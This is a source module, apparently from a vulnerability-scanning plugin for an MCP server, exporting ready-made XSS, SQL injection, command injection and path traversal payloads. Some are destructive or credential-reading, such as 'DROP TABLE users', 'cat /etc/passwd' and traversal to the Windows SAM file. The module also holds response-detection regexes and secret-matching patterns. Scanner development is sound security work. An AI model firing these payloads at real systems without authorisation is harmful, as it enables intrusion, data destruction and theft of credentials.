// =========================================
// MCP Server Plugin - Security Payloads
// =========================================
// Pre-defined payloads for vulnerability scanning

// XSS Payloads
export const XSS_PAYLOADS = [
    // Basic XSS
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert('XSS')>",

    // Event handlers
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",

    // Encoding bypasses
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",

    // JavaScript protocol
    "javascript:alert(1)",
    "javascript:alert('XSS')",

    // Polyglots
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
    "'><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'-alert(1)-'",
    "\"-alert(1)-\"",
];

// SQL Injection Payloads
export const SQLI_PAYLOADS = [
    // Basic
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "admin' #",
    "admin'/*",

    // UNION based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "1' UNION SELECT username, password FROM users--",

    // Error based
    "' AND 1=CONVERT(int, @@version)--",
    "' AND extractvalue(1, concat(0x7e, version()))--",

    // Time based
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",

    // Blind
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",

    // Stacked queries
    "'; DROP TABLE users;--",
    "'; INSERT INTO users VALUES('hacked', 'password');--",
];

// Command Injection Payloads
export const COMMAND_INJECTION_PAYLOADS = [
    // Unix
    "; ls",
    "; ls -la",
    "| ls",
    "| ls -la",
    "`ls`",
    "$(ls)",
    "&& ls",
    "|| ls",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; whoami",
    "| whoami",
    "; id",
    "| id",
    "; uname -a",

    // Windows
    "& dir",
    "| dir",
    "; dir",
    "& whoami",
    "| whoami",
    "& type C:\\Windows\\System32\\drivers\\etc\\hosts",

    // Encoded
    "%0als",
    "%0a cat /etc/passwd",
    "\\n ls",
    "\\n cat /etc/passwd",
];

// Path Traversal Payloads
export const PATH_TRAVERSAL_PAYLOADS = [
    // Basic
    "../../../etc/passwd",
    "..\\..\\..\\etc\\passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../windows/system32/config/sam",

    // Encoded
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",

    // Double encoding
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\etc\\passwd",
    "..../..../..../etc/passwd",

    // Null byte
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",

    // Filter bypass
    "....//....//....//etc/passwd",
    "..../....//....//etc/passwd",
    "/var/www/../../etc/passwd",
];

// Detection patterns for vulnerability responses
export const VULNERABILITY_PATTERNS = {
    xss: {
        reflected: [
            /<script>alert\(1\)<\/script>/i,
            /<script>alert\('XSS'\)<\/script>/i,
            /onerror=alert\(1\)/i,
            /onload=alert\(1\)/i,
        ],
    },
    sqli: {
        error: [
            /SQL syntax.*MySQL/i,
            /Warning.*mysql_/i,
            /PostgreSQL.*ERROR/i,
            /ORA-\d{5}/i, // Oracle
            /Microsoft SQL Native Client error/i,
            /ODBC SQL Server Driver/i,
            /SQLite3::SQLException/i,
            /SQLite\/JDBCDriver/i,
            /Unclosed quotation mark/i,
            /quoted string not properly terminated/i,
        ],
    },
    commandInjection: {
        unix: [
            /root:.*:0:0:/i, // /etc/passwd
            /uid=\d+.*gid=\d+/i, // id command
            /Linux.*\d+\.\d+/i, // uname
        ],
        windows: [
            /Directory of/i,
            /Volume Serial Number/i,
            /\w+\\\w+/i, // Domain\Username
        ],
    },
    pathTraversal: {
        unix: [
            /root:.*:0:0:/i, // /etc/passwd
            /daemon:.*:1:1:/i,
            /bin:.*:2:2:/i,
        ],
        windows: [
            /\[boot loader\]/i, // boot.ini
            /\[fonts\]/i, // win.ini
        ],
    },
};

// Security headers to check
export const SECURITY_HEADERS = [
    "Content-Security-Policy",
    "X-Content-Type-Options",
    "X-Frame-Options",
    "X-XSS-Protection",
    "Strict-Transport-Security",
    "Referrer-Policy",
    "Permissions-Policy",
    "Cross-Origin-Opener-Policy",
    "Cross-Origin-Resource-Policy",
    "Cross-Origin-Embedder-Policy",
];

// Sensitive data patterns
export const SENSITIVE_DATA_PATTERNS = {
    email: /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g,
    ssn: /\b\d{3}-\d{2}-\d{4}\b/g,
    creditCard: /\b(?:\d{4}[-\s]?){3}\d{4}\b/g,
    apiKey: /(?:api[_-]?key|apikey)["\s:=]+["']?([a-zA-Z0-9_-]{20,})["']?/gi,
    jwt: /eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*/g,
    awsKey: /AKIA[0-9A-Z]{16}/g,
    privateKey: /-----BEGIN (?:RSA |DSA |EC )?PRIVATE KEY-----/g,
    password: /(?:password|passwd|pwd)["\s:=]+["']?([^"'\s]{4,})["']?/gi,
};

// Error message patterns
export const ERROR_PATTERNS = {
    php: [
        /Fatal error:.*in.*on line \d+/i,
        /Parse error:.*in.*on line \d+/i,
        /Warning:.*in.*on line \d+/i,
        /Notice:.*in.*on line \d+/i,
    ],
    python: [
        /Traceback \(most recent call last\)/i,
        /File ".*", line \d+/i,
        /SyntaxError:/i,
        /IndentationError:/i,
    ],
    java: [
        /java\.lang\.\w+Exception/i,
        /at .*\(.*\.java:\d+\)/i,
        /Caused by:/i,
    ],
    aspnet: [
        /Server Error in '.*' Application/i,
        /System\.Web\.HttpException/i,
        /ASP\.NET.*Exception/i,
    ],
    nodejs: [
        /ReferenceError:/i,
        /TypeError:/i,
        /SyntaxError:/i,
        /at Object\.<anonymous>/i,
    ],
};
